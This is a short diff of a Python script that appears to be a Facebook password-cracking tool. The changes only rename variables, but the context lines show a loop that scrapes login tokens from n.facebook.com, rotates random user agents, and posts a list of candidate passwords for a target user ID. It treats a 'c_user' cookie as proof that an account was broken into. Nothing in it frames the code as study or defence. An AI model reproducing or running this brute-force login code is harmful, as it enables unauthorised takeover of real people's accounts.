@@ -1004,7 +1004,7 @@ def gxds_files(uid, pxss):
         for ps in pxss:
             qwerty = random.choice(gxdsUArndm)
             gxdsfbs = session.get("https://n.facebook.com").text
-            info = {
+            dxta = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                 "jazoest": re.search(
                     'name="jazoest" value="(.*?)"', str(gxdsfbs)
@@ -1017,7 +1017,7 @@ def gxds_files(uid, pxss):
                 "pass": ps,
                 "login": "Log In",
             }
-            update = {
+            headxr = {
                 "authority": "https://n.facebook.com",
                 "method": "POST",
                 "scheme": "https",
@@ -1041,8 +1041,8 @@ def gxds_files(uid, pxss):
             }
             session.post(
                 url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
-                data=info,
-                headers=update,
+                data=dxta,
+                headers=headxr,
             ).text
             q = session.cookies.get_dict().keys()
             if "c_user" in q:
